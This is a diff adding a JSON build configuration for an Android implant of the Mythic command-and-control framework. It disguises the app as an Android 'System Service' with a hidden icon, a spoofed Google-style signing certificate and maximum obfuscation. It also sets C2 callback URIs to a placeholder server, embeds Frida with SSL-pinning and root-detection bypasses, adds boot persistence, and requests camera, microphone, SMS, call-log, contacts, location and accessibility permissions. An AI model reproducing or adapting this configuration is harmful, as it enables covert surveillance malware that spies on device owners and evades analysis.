@@ -1,0 +1,102 @@
+{
+  "campaign_id": "mythic_android_enhanced",
+  "device_id": "android_device_001",
+  "target_android_version": "34",
+  
+  "app_configuration": {
+    "package_name": "com.android.systemservice",
+    "app_name": "System Service",
+    "hide_app_icon": true,
+    "stealth_mode": true
+  },
+  
+  "c2_configuration": {
+    "callback_host": "https://your-mythic-server.com",
+    "callback_port": "443",
+    "get_uri": "/api/v1/mobile/checkin",
+    "post_uri": "/api/v1/mobile/submit",
+    "user_agent": "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36"
+  },
+  
+  "frida_configuration": {
+    "embed_frida": true,
+    "frida_version": "16.1.4",
+    "auto_start_server": true,
+    "default_scripts": [
+      "basic_hooks",
+      "ssl_bypass",
+      "root_bypass"
+    ],
+    "multi_handler_enabled": true
+  },
+  
+  "proguard_configuration": {
+    "enable_proguard": true,
+    "obfuscation_level": "maximum",
+    "string_encryption": true,
+    "control_flow_obfuscation": true,
+    "dead_code_injection": true,
+    "custom_dictionaries": true
+  },
+  
+  "obfuscation_level": "strong",
+  
+  "build_options": {
+    "native_components": true,
+    "anti_analysis": true,
+    "enhanced_stealth": true,
+    "privacy_sandbox_compliance": true,
+    "multiple_architectures": [
+      "arm64-v8a",
+      "armeabi-v7a",
+      "x86_64",
+      "x86"
+    ]
+  },
+  
+  "signing_configuration": {
+    "generate_keystore": true,
+    "keystore_password": "mythic123",
+    "key_password": "mythic123",
+    "key_alias": "mythic_key",
+    "cert_cn": "Android System Service",
+    "cert_ou": "System Services",
+    "cert_o": "Android",
+    "cert_l": "Mountain View",
+    "cert_st": "California",
+    "cert_c": "US"
+  },
+  
+  "advanced_features": {
+    "offline_sync": true,
+    "encrypted_storage": true,
+    "self_delete": false,
+    "persistence_mechanisms": [
+      "boot_receiver",
+      "service_restart",
+      "alarm_manager"
+    ]
+  },
+  
+  "permissions": [
+    "android.permission.INTERNET",
+    "android.permission.ACCESS_NETWORK_STATE",
+    "android.permission.ACCESS_WIFI_STATE",
+    "android.permission.WRITE_EXTERNAL_STORAGE",
+    "android.permission.READ_EXTERNAL_STORAGE",
+    "android.permission.ACCESS_FINE_LOCATION",
+    "android.permission.ACCESS_COARSE_LOCATION",
+    "android.permission.CAMERA",
+    "android.permission.RECORD_AUDIO",
+    "android.permission.READ_PHONE_STATE",
+    "android.permission.READ_SMS",
+    "android.permission.SEND_SMS",
+    "android.permission.READ_CALL_LOG",
+    "android.permission.READ_CONTACTS",
+    "android.permission.SYSTEM_ALERT_WINDOW",
+    "android.permission.BIND_ACCESSIBILITY_SERVICE",
+    "android.permission.RECEIVE_BOOT_COMPLETED",
+    "android.permission.FOREGROUND_SERVICE",
+    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
+  ]
+}
